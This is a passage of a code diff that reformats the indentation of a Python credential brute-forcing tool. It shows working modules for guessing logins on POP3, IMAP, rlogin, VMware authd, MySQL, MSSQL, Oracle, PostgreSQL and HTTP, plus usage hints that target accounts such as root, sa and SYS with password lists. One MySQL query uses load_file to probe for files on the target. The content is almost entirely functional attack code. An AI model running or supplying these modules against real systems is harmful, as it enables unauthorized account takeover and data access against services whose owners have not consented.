-      fp = POP3(host, int(port), timeout=int(timeout))
-    else:
-      if not port: port = 995
-      fp = POP3_SSL(host, int(port)) # timeout=int(timeout)) # no timeout option in python2
+    def connect(self, host, port, ssl, timeout):
+        if ssl == '0':
+            if not port: port = 110
+            fp = POP3(host, int(port), timeout=int(timeout))
+        else:
+            if not port: port = 995
+            fp = POP3_SSL(host, int(port))  # timeout=int(timeout)) # no timeout option in python2
 
-    return POP_Connection(fp, fp.welcome)
+        return POP_Connection(fp, fp.welcome)
 
-  def execute(self, host, port='', ssl='0', user=None, password=None, timeout='10', persistent='1'):
+    def execute(self, host, port='', ssl='0', user=None, password=None, timeout='10', persistent='1'):
 
-    with Timing() as timing:
-      fp, resp = self.bind(host, port, ssl, timeout=timeout)
-
-    try:
-      if user is not None or password is not None:
         with Timing() as timing:
+            fp, resp = self.bind(host, port, ssl, timeout=timeout)
 
-          if user is not None:
-            resp = fp.user(user)
-          if password is not None:
-            resp = fp.pass_(password)
+        try:
+            if user is not None or password is not None:
+                with Timing() as timing:
 
-      logger.debug('No error: %s' % resp)
-      self.reset()
+                    if user is not None:
+                        resp = fp.user(user)
+                    if password is not None:
+                        resp = fp.pass_(password)
 
-    except pop_error as e:
-      logger.debug('pop_error: %s' % e)
-      resp = str(e)
+            logger.debug('No error: %s' % resp)
+            self.reset()
 
-    if persistent == '0':
-      self.reset()
+        except pop_error as e:
+            logger.debug('pop_error: %s' % e)
+            resp = str(e)
 
-    code, mesg = resp.split(' ', 1)
-    return self.Response(code, mesg, timing)
+        if persistent == '0':
+            self.reset()
+
+        code, mesg = resp.split(' ', 1)
+        return self.Response(code, mesg, timing)
+
 
 class POP_passd:
-  '''Brute-force poppassd (http://netwinsite.com/poppassd/)'''
+    '''Brute-force poppassd (http://netwinsite.com/poppassd/)'''
 
-  usage_hints = (
-    '''%prog host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt -x ignore:code=500''',
+    usage_hints = (
+        '''%prog host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt -x ignore:code=500''',
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [106]'),
-    ('user', 'usernames to test'),
-    ('password', 'passwords to test'),
-    ('timeout', 'seconds to wait for a response [10]'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [106]'),
+        ('user', 'usernames to test'),
+        ('password', 'passwords to test'),
+        ('timeout', 'seconds to wait for a response [10]'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, host, port='106', user=None, password=None, timeout='10'):
+    def execute(self, host, port='106', user=None, password=None, timeout='10'):
 
-    fp = LineReceiver()
-    with Timing() as timing:
-      resp = fp.connect(host, int(port), int(timeout))
-    trace = resp + '\r\n'
-
-    try:
-      if user is not None or password is not None:
+        fp = LineReceiver()
         with Timing() as timing:
+            resp = fp.connect(host, int(port), int(timeout))
+        trace = resp + '\r\n'
 
-          if user is not None:
-            cmd = 'USER %s' % user
-            resp = fp.sendcmd(cmd)
+        try:
+            if user is not None or password is not None:
+                with Timing() as timing:
+
+                    if user is not None:
+                        cmd = 'USER %s' % user
+                        resp = fp.sendcmd(cmd)
+                        trace += '%s\r\n%s\r\n' % (cmd, resp)
+
+                    if password is not None:
+                        cmd = 'PASS %s' % password
+                        resp = fp.sendcmd(cmd)
+                        trace += '%s\r\n%s\r\n' % (cmd, resp)
+
+        except LineReceiver_Error as e:
+            resp = str(e)
+            logger.debug('LineReceiver_Error: %s' % resp)
             trace += '%s\r\n%s\r\n' % (cmd, resp)
 
-          if password is not None:
-            cmd = 'PASS %s' % password
-            resp = fp.sendcmd(cmd)
-            trace += '%s\r\n%s\r\n' % (cmd, resp)
+        finally:
+            fp.close()
 
-    except LineReceiver_Error as e:
-      resp = str(e)
-      logger.debug('LineReceiver_Error: %s' % resp)
-      trace += '%s\r\n%s\r\n' % (cmd, resp)
+        code, mesg = fp.parse(resp)
+        return self.Response(code, mesg, timing, trace)
 
-    finally:
-      fp.close()
-
-    code, mesg = fp.parse(resp)
-    return self.Response(code, mesg, timing, trace)
 
 # }}}
 
 # IMAP {{{
 from imaplib import IMAP4, IMAP4_SSL
+
+
 class IMAP_login:
-  '''Brute-force IMAP4'''
+    '''Brute-force IMAP4'''
 
-  usage_hints = (
-    '''%prog host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt''',
+    usage_hints = (
+        '''%prog host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt''',
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [143]'),
-    ('user', 'usernames to test'),
-    ('password', 'passwords to test'),
-    ('ssl', 'use SSL [0|1]'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [143]'),
+        ('user', 'usernames to test'),
+        ('password', 'passwords to test'),
+        ('ssl', 'use SSL [0|1]'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, host, port='', ssl='0', user=None, password=None):
-    if ssl == '0':
-      if not port: port = 143
-      klass = IMAP4
-    else:
-      if not port: port = 993
-      klass = IMAP4_SSL
+    def execute(self, host, port='', ssl='0', user=None, password=None):
+        if ssl == '0':
+            if not port: port = 143
+            klass = IMAP4
+        else:
+            if not port: port = 993
+            klass = IMAP4_SSL
 
-    with Timing() as timing:
-      fp = klass(host, port)
-
-    code, resp = 0, fp.welcome
-
-    try:
-      if user is not None and password is not None:
         with Timing() as timing:
-          r = fp.login(user, password)
-        resp = ', '.join(r[1])
+            fp = klass(host, port)
 
-      # doesn't it need to self.reset() to test more creds?
+        code, resp = 0, fp.welcome
 
-    except IMAP4.error as e:
-      logger.debug('imap_error: %s' % e)
-      code, resp = 1, str(e)
+        try:
+            if user is not None and password is not None:
+                with Timing() as timing:
+                    r = fp.login(user, password)
+                resp = ', '.join(r[1])
 
-    return self.Response(code, resp, timing)
+                # doesn't it need to self.reset() to test more creds?
+
+        except IMAP4.error as e:
+            logger.debug('imap_error: %s' % e)
+            code, resp = 1, str(e)
+
+        return self.Response(code, resp, timing)
+
 
 # }}}
 
 # rlogin {{{
 class Rlogin_login(TCP_Cache):
-  '''Brute-force rlogin'''
+    '''Brute-force rlogin'''
 
-  usage_hints = (
-    """Please note that rlogin requires to bind a socket to an Internet domain privileged port.""",
-    """%prog host=10.0.0.1 user=root luser=FILE0 0=logins.txt persistent=0 -x ignore:fgrep=Password:""",
-    """%prog host=10.0.0.1 user=john password=FILE0 0=passwords.txt -x 'reset:egrep!=Login incorrect.+login:'""",
+    usage_hints = (
+        """Please note that rlogin requires to bind a socket to an Internet domain privileged port.""",
+        """%prog host=10.0.0.1 user=root luser=FILE0 0=logins.txt persistent=0 -x ignore:fgrep=Password:""",
+        """%prog host=10.0.0.1 user=john password=FILE0 0=passwords.txt -x 'reset:egrep!=Login incorrect.+login:'""",
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [513]'),
-    ('luser', 'client username [root]'),
-    ('user', 'usernames to test'),
-    ('password', 'passwords to test'),
-    ('prompt_re', 'regular expression to match prompts [\w+:]'),
-    ('timeout', 'seconds to wait for a response and for prompt_re to match received data [10]'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [513]'),
+        ('luser', 'client username [root]'),
+        ('user', 'usernames to test'),
+        ('password', 'passwords to test'),
+        ('prompt_re', 'regular expression to match prompts [\w+:]'),
+        ('timeout', 'seconds to wait for a response and for prompt_re to match received data [10]'),
     )
-  available_options += TCP_Cache.available_options
+    available_options += TCP_Cache.available_options
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def connect(self, host, port, timeout):
-    fp = Telnet()
+    def connect(self, host, port, timeout):
+        fp = Telnet()
 
-    for i in range(50):
-      try:
-        fp.sock = socket.create_connection((host, int(port)), timeout=int(timeout), source_address=('', 1023 - i))
-        break
-      except socket.error as e:
-        if (e.errno, e.strerror) != (98, 'Address already in use'):
-          raise e
+        for i in range(50):
+            try:
+                fp.sock = socket.create_connection((host, int(port)), timeout=int(timeout),
+                                                   source_address=('', 1023 - i))
+                break
+            except socket.error as e:
+                if (e.errno, e.strerror) != (98, 'Address already in use'):
+                    raise e
 
-    self.need_handshake = True
+        self.need_handshake = True
 
-    return TCP_Connection(fp)
+        return TCP_Connection(fp)
 
-  def execute(self, host, port='513', luser='root', user='', password=None, prompt_re='\w+:', timeout='10', persistent='1'):
+    def execute(self, host, port='513', luser='root', user='', password=None, prompt_re='\w+:', timeout='10',
+                persistent='1'):
 
-    fp, _ = self.bind(host, port, timeout=int(timeout))
+        fp, _ = self.bind(host, port, timeout=int(timeout))
 
-    trace = ''
-    timeout = int(timeout)
+        trace = ''
+        timeout = int(timeout)
 
-    with Timing() as timing:
-      if self.need_handshake:
-        fp.write('\x00%s\x00%s\x00vt100/9600\x00' % (luser, user))
-        self.need_handshake = False
-      else:
-        fp.write('%s\r' % user)
+        with Timing() as timing:
+            if self.need_handshake:
+                fp.write('\x00%s\x00%s\x00vt100/9600\x00' % (luser, user))
+                self.need_handshake = False
+            else:
+                fp.write('%s\r' % user)
 
-      _, _, resp = fp.expect([prompt_re], timeout=timeout) # expecting the Password: prompt
-      trace += resp
+            _, _, resp = fp.expect([prompt_re], timeout=timeout)  # expecting the Password: prompt
+            trace += resp
 
-      if password is not None:
-        fp.write('%s\r' % password)
-        _, _, resp = fp.expect([prompt_re], timeout=timeout) # expecting the login: prompt
-        trace += resp
+            if password is not None:
+                fp.write('%s\r' % password)
+                _, _, resp = fp.expect([prompt_re], timeout=timeout)  # expecting the login: prompt
+                trace += resp
 
-    if persistent == '0':
-      self.reset()
+        if persistent == '0':
+            self.reset()
 
-    mesg = repr(resp.strip())[1:-1]
-    return self.Response(0, mesg, timing, trace)
+        mesg = repr(resp.strip())[1:-1]
+        return self.Response(0, mesg, timing, trace)
+
+
 # }}}
 
 # VMauthd {{{
 from ssl import wrap_socket
+
+
 class LineReceiver_Error(Exception): pass
+
+
 class LineReceiver:
+    def connect(self, host, port, timeout, ssl=False):
+        self.sock = socket.create_connection((host, port), timeout)
+        banner = self.getresp()
 
-  def connect(self, host, port, timeout, ssl=False):
-    self.sock = socket.create_connection((host, port), timeout)
-    banner = self.getresp()
+        if ssl:
+            self.sock = wrap_socket(self.sock)
 
-    if ssl:
-      self.sock = wrap_socket(self.sock)
+        return banner  # welcome banner
 
-    return banner # welcome banner
+    def close(self):
+        self.sock.close()
 
-  def close(self):
-    self.sock.close()
+    def sendcmd(self, cmd):
+        self.sock.sendall(cmd + '\r\n')
+        return self.getresp()
 
-  def sendcmd(self, cmd):
-    self.sock.sendall(cmd + '\r\n')
-    return self.getresp()
+    def getresp(self):
+        resp = self.sock.recv(1024)
+        while not resp.endswith('\n'):
+            resp += self.sock.recv(1024)
 
-  def getresp(self):
-    resp = self.sock.recv(1024)
-    while not resp.endswith('\n'):
-      resp += self.sock.recv(1024)
+        resp = resp.rstrip()
+        code, _ = self.parse(resp)
 
-    resp = resp.rstrip()
-    code, _ = self.parse(resp)
+        if not code.isdigit():
+            raise Exception('Unexpected response: %s' % resp)
 
-    if not code.isdigit():
-      raise Exception('Unexpected response: %s' % resp)
+        if code[0] not in ('1', '2', '3'):
+            raise LineReceiver_Error(resp)
 
-    if code[0] not in ('1', '2', '3'):
-      raise LineReceiver_Error(resp)
+        return resp
 
-    return resp
+    def parse(self, resp):
+        i = resp.rfind('\n') + 1
+        code = resp[i:i + 3]
+        mesg = resp[i + 4:]
 
-  def parse(self, resp):
-    i = resp.rfind('\n') + 1
-    code = resp[i:i+3]
-    mesg = resp[i+4:]
+        return code, mesg
 
-    return code, mesg
 
 class VMauthd_login(TCP_Cache):
-  '''Brute-force VMware Authentication Daemon'''
+    '''Brute-force VMware Authentication Daemon'''
 
-  usage_hints = (
-    '''%prog host=10.0.0.1 user=root password=FILE0 0=passwords.txt''',
+    usage_hints = (
+        '''%prog host=10.0.0.1 user=root password=FILE0 0=passwords.txt''',
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [902]'),
-    ('user', 'usernames to test'),
-    ('password', 'passwords to test'),
-    ('ssl', 'use SSL [1|0]'),
-    ('timeout', 'seconds to wait for a response [10]'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [902]'),
+        ('user', 'usernames to test'),
+        ('password', 'passwords to test'),
+        ('ssl', 'use SSL [1|0]'),
+        ('timeout', 'seconds to wait for a response [10]'),
     )
-  available_options += TCP_Cache.available_options
+    available_options += TCP_Cache.available_options
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def connect(self, host, port, ssl, timeout):
-    fp = LineReceiver()
-    banner = fp.connect(host, int(port), int(timeout), ssl != '0')
-    return TCP_Connection(fp, banner)
+    def connect(self, host, port, ssl, timeout):
+        fp = LineReceiver()
+        banner = fp.connect(host, int(port), int(timeout), ssl != '0')
+        return TCP_Connection(fp, banner)
 
-  def execute(self, host, port='902', user=None, password=None, ssl='1', timeout='10', persistent='1'):
+    def execute(self, host, port='902', user=None, password=None, ssl='1', timeout='10', persistent='1'):
 
-    with Timing() as timing:
-      fp, resp = self.bind(host, port, ssl, timeout=timeout)
-    trace = resp + '\r\n'
-
-    try:
-      if user is not None or password is not None:
         with Timing() as timing:
+            fp, resp = self.bind(host, port, ssl, timeout=timeout)
+        trace = resp + '\r\n'
 
-          if user is not None:
-            cmd = 'USER %s' % user
-            resp = fp.sendcmd(cmd)
+        try:
+            if user is not None or password is not None:
+                with Timing() as timing:
+
+                    if user is not None:
+                        cmd = 'USER %s' % user
+                        resp = fp.sendcmd(cmd)
+                        trace += '%s\r\n%s\r\n' % (cmd, resp)
+
+                    if password is not None:
+                        cmd = 'PASS %s' % password
+                        resp = fp.sendcmd(cmd)
+                        trace += '%s\r\n%s\r\n' % (cmd, resp)
+
+        except LineReceiver_Error as e:
+            resp = str(e)
+            logger.debug('LineReceiver_Error: %s' % resp)
             trace += '%s\r\n%s\r\n' % (cmd, resp)
 
-          if password is not None:
-            cmd = 'PASS %s' % password
-            resp = fp.sendcmd(cmd)
-            trace += '%s\r\n%s\r\n' % (cmd, resp)
+        if persistent == '0':
+            self.reset()
 
-    except LineReceiver_Error as e:
-      resp = str(e)
-      logger.debug('LineReceiver_Error: %s' % resp)
-      trace += '%s\r\n%s\r\n' % (cmd, resp)
+        code, mesg = fp.parse(resp)
+        return self.Response(code, mesg, timing, trace)
 
-    if persistent == '0':
-      self.reset()
-
-    code, mesg = fp.parse(resp)
-    return self.Response(code, mesg, timing, trace)
 
 # }}}
 
 # MySQL {{{
 try:
-  import _mysql
+    import _mysql
 except ImportError:
-  notfound.append('mysql-python')
+    notfound.append('mysql-python')
+
 
 class MySQL_login:
-  '''Brute-force MySQL'''
+    '''Brute-force MySQL'''
 
-  usage_hints = (
-    """%prog host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt -x ignore:fgrep='Access denied for user'""",
+    usage_hints = (
+        """%prog host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt -x ignore:fgrep='Access denied for user'""",
     )
-  
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [3306]'),
-    ('user', 'usernames to test'),
-    ('password', 'passwords to test'),
-    ('timeout', 'seconds to wait for a response [10]'),
+
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [3306]'),
+        ('user', 'usernames to test'),
+        ('password', 'passwords to test'),
+        ('timeout', 'seconds to wait for a response [10]'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, host, port='3306', user='anony', password='', timeout='10'):
+    def execute(self, host, port='3306', user='anony', password='', timeout='10'):
 
-    try:
-      with Timing() as timing:
-        fp = _mysql.connect(host=host, port=int(port), user=user, passwd=password, connect_timeout=int(timeout))
+        try:
+            with Timing() as timing:
+                fp = _mysql.connect(host=host, port=int(port), user=user, passwd=password, connect_timeout=int(timeout))
 
-      resp = '0', fp.get_server_info()
+            resp = '0', fp.get_server_info()
 
-    except _mysql.Error as resp:
-      logger.debug('MysqlError: %s' % resp)
+        except _mysql.Error as resp:
+            logger.debug('MysqlError: %s' % resp)
 
-    code, mesg = resp
-    return self.Response(code, mesg, timing)
+        code, mesg = resp
+        return self.Response(code, mesg, timing)
+
 
 class MySQL_query(TCP_Cache):
-  '''Brute-force MySQL queries'''
+    '''Brute-force MySQL queries'''
 
-  usage_hints = (
-    '''%prog host=10.0.0.1 user=root password=s3cr3t query="select length(load_file('/home/adam/FILE0'))" 0=files.txt -x ignore:size=0''',
+    usage_hints = (
+        '''%prog host=10.0.0.1 user=root password=s3cr3t query="select length(load_file('/home/adam/FILE0'))" 0=files.txt -x ignore:size=0''',
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [3306]'),
-    ('user', 'username to use'),
-    ('password', 'password to use'),
-    ('query', 'SQL query to execute'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [3306]'),
+        ('user', 'username to use'),
+        ('password', 'password to use'),
+        ('query', 'SQL query to execute'),
     )
 
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def connect(self, host, port, user, password):
-    fp = _mysql.connect(host=host, port=int(port), user=user, passwd=password) # db=db
-    return TCP_Connection(fp)
+    def connect(self, host, port, user, password):
+        fp = _mysql.connect(host=host, port=int(port), user=user, passwd=password)  # db=db
+        return TCP_Connection(fp)
 
-  def execute(self, host, port='3306', user='', password='', query='select @@version'):
+    def execute(self, host, port='3306', user='', password='', query='select @@version'):
+        fp, _ = self.bind(host, port, user, password)
 
-    fp, _ = self.bind(host, port, user, password)
+        with Timing() as timing:
+            fp.query(query)
 
-    with Timing() as timing:
-      fp.query(query)
+        rs = fp.store_result()
+        rows = rs.fetch_row(10, 0)
 
-    rs = fp.store_result()
-    rows = rs.fetch_row(10, 0)
+        code, mesg = '0', '\n'.join(', '.join(map(str, r)) for r in filter(any, rows))
+        return self.Response(code, mesg, timing)
 
-    code, mesg = '0', '\n'.join(', '.join(map(str, r)) for r in filter(any, rows))
-    return self.Response(code, mesg, timing)
 
 # }}}
 
 # MSSQL {{{
 # I did not use pymssql because neither version 1.x nor 2.0.0b1_dev were multithreads safe (they all segfault)
 try:
-  from impacket import tds
-  from impacket.tds import TDS_ERROR_TOKEN, TDS_LOGINACK_TOKEN
+    from impacket import tds
+    from impacket.tds import TDS_ERROR_TOKEN, TDS_LOGINACK_TOKEN
 except ImportError:
-  notfound.append('impacket')
+    notfound.append('impacket')
+
+
 class MSSQL_login:
-  '''Brute-force MSSQL'''
+    '''Brute-force MSSQL'''
 
-  usage_hints = (
-    """%prog host=10.0.0.1 user=sa password=FILE0 0=passwords.txt -x ignore:fgrep='Login failed for user'""",
+    usage_hints = (
+        """%prog host=10.0.0.1 user=sa password=FILE0 0=passwords.txt -x ignore:fgrep='Login failed for user'""",
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [1433]'),
-    ('user', 'usernames to test'),
-    ('password', 'passwords to test'),
-    ('windows_auth', 'use Windows auth [0|1]'),
-    ('domain', 'domain to test []'),
-    ('password_hash', "LM/NT hashes to test ('lm:nt' or ':nt')"),
-    #('timeout', 'seconds to wait for a response [10]'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [1433]'),
+        ('user', 'usernames to test'),
+        ('password', 'passwords to test'),
+        ('windows_auth', 'use Windows auth [0|1]'),
+        ('domain', 'domain to test []'),
+        ('password_hash', "LM/NT hashes to test ('lm:nt' or ':nt')"),
+        # ('timeout', 'seconds to wait for a response [10]'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, host, port='1433', user='', password='', windows_auth='0', domain='', password_hash=None): #, timeout='10'):
+    def execute(self, host, port='1433', user='', password='', windows_auth='0', domain='',
+                password_hash=None):  # , timeout='10'):
 
-    fp = tds.MSSQL(host, int(port))
-    fp.connect()
+        fp = tds.MSSQL(host, int(port))
+        fp.connect()
 
-    with Timing() as timing:
-      if windows_auth == '0':
-        r = fp.login(None, user, password, None, None, False)
-      else:
-        r = fp.login(None, user, password, domain, password_hash, True)
+        with Timing() as timing:
+            if windows_auth == '0':
+                r = fp.login(None, user, password, None, None, False)
+            else:
+                r = fp.login(None, user, password, domain, password_hash, True)
 
-    if not r:
-      key = fp.replies[TDS_ERROR_TOKEN][0]
+        if not r:
+            key = fp.replies[TDS_ERROR_TOKEN][0]
 
-      code = key['Number']
-      mesg = key['MsgText'].decode('utf-16le')
+            code = key['Number']
+            mesg = key['MsgText'].decode('utf-16le')
 
-    else:
-      key = fp.replies[TDS_LOGINACK_TOKEN][0]
+        else:
+            key = fp.replies[TDS_LOGINACK_TOKEN][0]
 
-      code = '0'
-      mesg = '%s (%d%d %d%d)' % (key['ProgName'].decode('utf-16le'), key['MajorVer'], key['MinorVer'], key['BuildNumHi'], key['BuildNumLow'])
+            code = '0'
+            mesg = '%s (%d%d %d%d)' % (
+                key['ProgName'].decode('utf-16le'), key['MajorVer'], key['MinorVer'], key['BuildNumHi'],
+                key['BuildNumLow'])
 
-    fp.disconnect()
+        fp.disconnect()
 
-    return self.Response(code, mesg, timing)
+        return self.Response(code, mesg, timing)
+
+
 # }}}
 
 # Oracle {{{
 try:
-  import cx_Oracle
+    import cx_Oracle
 except ImportError:
-  notfound.append('cx_Oracle')
+    notfound.append('cx_Oracle')
+
 
 class Response_Oracle(Response_Base):
-  indicatorsfmt = [('code', -9), ('size', -4), ('time', 6)]
+    indicatorsfmt = [('code', -9), ('size', -4), ('time', 6)]
+
 
 class Oracle_login:
-  '''Brute-force Oracle'''
+    '''Brute-force Oracle'''
 
-  usage_hints = (
-    """%prog host=10.0.0.1 sid=FILE0 0=sids.txt -x ignore:code=ORA-12505""",
-    """%prog host=10.0.0.1 user=SYS password=FILE0 0=passwords.txt -x ignore:code=ORA-01017""",
+    usage_hints = (
+        """%prog host=10.0.0.1 sid=FILE0 0=sids.txt -x ignore:code=ORA-12505""",
+        """%prog host=10.0.0.1 user=SYS password=FILE0 0=passwords.txt -x ignore:code=ORA-01017""",
     )
-  
-  available_options = (
-    ('host', 'hostnames or subnets to target'),
-    ('port', 'ports to target [1521]'),
-    ('user', 'usernames to test'),
-    ('password', 'passwords to test'),
-    ('sid', 'sid to test'),
-    ('service_name', 'service name to test'),
+
+    available_options = (
+        ('host', 'hostnames or subnets to target'),
+        ('port', 'ports to target [1521]'),
+        ('user', 'usernames to test'),
+        ('password', 'passwords to test'),
+        ('sid', 'sid to test'),
+        ('service_name', 'service name to test'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Oracle
+    Response = Response_Oracle
 
-  def execute(self, host, port='1521', user='', password='', sid='', service_name=''):
+    def execute(self, host, port='1521', user='', password='', sid='', service_name=''):
 
-    if sid:
-      dsn = cx_Oracle.makedsn(host=host, port=port, sid=sid)
-    elif service_name:
-      dsn = cx_Oracle.makedsn(host=host, port=port, service_name=service_name)
-    else:
-      raise NotImplementedError("Options sid and service_name cannot be both empty")
+        if sid:
+            dsn = cx_Oracle.makedsn(host=host, port=port, sid=sid)
+        elif service_name:
+            dsn = cx_Oracle.makedsn(host=host, port=port, service_name=service_name)
+        else:
+            raise NotImplementedError("Options sid and service_name cannot be both empty")
 
-    try:
-      with Timing() as timing:
-        fp = cx_Oracle.connect(user, password, dsn, threaded=True)
+        try:
+            with Timing() as timing:
+                fp = cx_Oracle.connect(user, password, dsn, threaded=True)
 
-      code, mesg = '0', fp.version
+            code, mesg = '0', fp.version
 
-    except cx_Oracle.DatabaseError as e:
-      code, mesg = e.args[0].message[:-1].split(': ', 1)
-      
-    return self.Response(code, mesg, timing)
+        except cx_Oracle.DatabaseError as e:
+            code, mesg = e.args[0].message[:-1].split(': ', 1)
+
+        return self.Response(code, mesg, timing)
+
 
 # }}}
 
 # PostgreSQL {{{
 try:
-  import psycopg2
+    import psycopg2
 except ImportError:
-  notfound.append('psycopg')
+    notfound.append('psycopg')
+
 
 class Pgsql_login:
-  '''Brute-force PostgreSQL'''
+    '''Brute-force PostgreSQL'''
 
-  usage_hints = (
-    """%prog host=10.0.0.1 user=postgres password=FILE0 0=passwords.txt -x ignore:fgrep='password authentication failed for user'""",
+    usage_hints = (
+        """%prog host=10.0.0.1 user=postgres password=FILE0 0=passwords.txt -x ignore:fgrep='password authentication failed for user'""",
     )
-  
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [5432]'),
-    ('user', 'usernames to test'),
-    ('password', 'passwords to test'),
-    ('database', 'databases to test [postgres]'),
-    ('timeout', 'seconds to wait for a response [10]'),
+
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [5432]'),
+        ('user', 'usernames to test'),
+        ('password', 'passwords to test'),
+        ('database', 'databases to test [postgres]'),
+        ('timeout', 'seconds to wait for a response [10]'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, host, port='5432', user=None, password=None, database='postgres', ssl='disable', timeout='10'):
+    def execute(self, host, port='5432', user=None, password=None, database='postgres', ssl='disable', timeout='10'):
 
-    try:
-      with Timing() as timing:
-        psycopg2.connect(host=host, port=int(port), user=user, password=password, database=database, sslmode=ssl, connect_timeout=int(timeout))
+        try:
+            with Timing() as timing:
+                psycopg2.connect(host=host, port=int(port), user=user, password=password, database=database,
+                                 sslmode=ssl, connect_timeout=int(timeout))
 
-      code, mesg = '0', 'OK'
+            code, mesg = '0', 'OK'
 
-    except psycopg2.OperationalError as e:
-      logger.debug('OperationalError: %s' % e)
-      code, mesg = '1', str(e)[:-1]
-  
-    return self.Response(code, mesg, timing)
+        except psycopg2.OperationalError as e:
+            logger.debug('OperationalError: %s' % e)
+            code, mesg = '1', str(e)[:-1]
+
+        return self.Response(code, mesg, timing)
+
 
 # }}}
 
 # HTTP {{{
 try:
-  import pycurl
+    import pycurl
 except ImportError:
-  notfound.append('pycurl')
+    notfound.append('pycurl')
+
 
 class Response_HTTP(Response_Base):
+    indicatorsfmt = [('code', -4), ('size:clen', -13), ('time', 6)]
 
-  indicatorsfmt = [('code', -4), ('size:clen', -13), ('time', 6)]
+    def __init__(self, code, response, timing=0, trace=None, content_length=-1):
+        Response_Base.__init__(self, code, response, timing, trace=trace)
+        self.content_length = content_length
 
-  def __init__(self, code, response, timing=0, trace=None, content_length=-1):
-    Response_Base.__init__(self, code, response, timing, trace=trace)
-    self.content_length = content_length
+    def indicators(self):
+        return self.code, '%d:%d' % (self.size, self.content_length), '%.3f' % self.time
 
-  def indicators(self):
-    return self.code, '%d:%d' % (self.size, self.content_length), '%.3f' % self.time
+    def __str__(self):
+        lines = re.findall('^(HTTP/.+)$', self.mesg, re.M)
+        if lines:
+            return lines[-1]
+        else:
+            return self.mesg
 
-  def __str__(self):
-    lines = re.findall('^(HTTP/.+)$', self.mesg, re.M)
-    if lines:
-      return lines[-1]
-    else:
-      return self.mesg
+    def match_clen(self, val):
+        return match_range(self.content_length, val)
 
-  def match_clen(self, val):
-    return match_range(self.content_length, val)
+    def match_fgrep(self, val):
+        return val in self.mesg
 
-  def match_fgrep(self, val):
-    return val in self.mesg
+    def match_egrep(self, val):
+        return re.search(val, self.mesg, re.M)
 
-  def match_egrep(self, val):
-    return re.search(val, self.mesg, re.M)
-
-  available_conditions = Response_Base.available_conditions
-  available_conditions += (
-    ('clen', 'match Content-Length header (N or N-M or N- or -N)'),
+    available_conditions = Response_Base.available_conditions
+    available_conditions += (
+        ('clen', 'match Content-Length header (N or N-M or N- or -N)'),
     )
+
 
 class HTTP_fuzz(TCP_Cache):
-  '''Brute-force HTTP'''
+    '''Brute-force HTTP'''
 
-  usage_hints = [
-    """%prog url=http://10.0.0.1/FILE0 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500""",
+    usage_hints = [
+        """%prog url=http://10.0.0.1/FILE0 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500""",
 
-    """%prog url=http://10.0.0.1/manager/html user_pass=COMBO00:COMBO01 0=combos.txt"""
-    """ -x ignore:code=401""",
+        """%prog url=http://10.0.0.1/manager/html user_pass=COMBO00:COMBO01 0=combos.txt"""
+        """ -x ignore:code=401""",
 
-    """%prog url=http://10.0.0.1/phpmyadmin/index.php method=POST"""
-    """ body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=passwords.txt follow=1"""
-    """ accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'""",
+        """%prog url=http://10.0.0.1/phpmyadmin/index.php method=POST"""
+        """ body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=passwords.txt follow=1"""
+        """ accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'""",
     ]
 
-  available_options = (
-    ('url', 'target url (scheme://host[:port]/path?query)'),
-    #('host', 'target host'),
-    #('port', 'target port'),
-    #('scheme', 'scheme [http | https]'),
-    #('path', 'web path [/]'),
-    #('query', 'query string'),
-    ('body', 'body data'),
-    ('header', 'use custom headers'),
-    ('method', 'method to use [GET | POST | HEAD | ...]'),
-    ('auto_urlencode', 'automatically perform URL-encoding [1|0]'),
-    ('user_pass', 'username and password for HTTP authentication (user:pass)'),
-    ('auth_type', 'type of HTTP authentication [basic | digest | ntlm]'),
-    ('follow', 'follow any Location redirect [0|1]'),
-    ('max_follow', 'redirection limit [5]'),
-    ('accept_cookie', 'save received cookies to issue them in future requests [0|1]'),
-    ('http_proxy', 'HTTP proxy to use (host:port)'),
-    ('ssl_cert', 'client SSL certificate file (cert+key in PEM format)'),
-    ('timeout_tcp', 'seconds to wait for a TCP handshake [10]'),
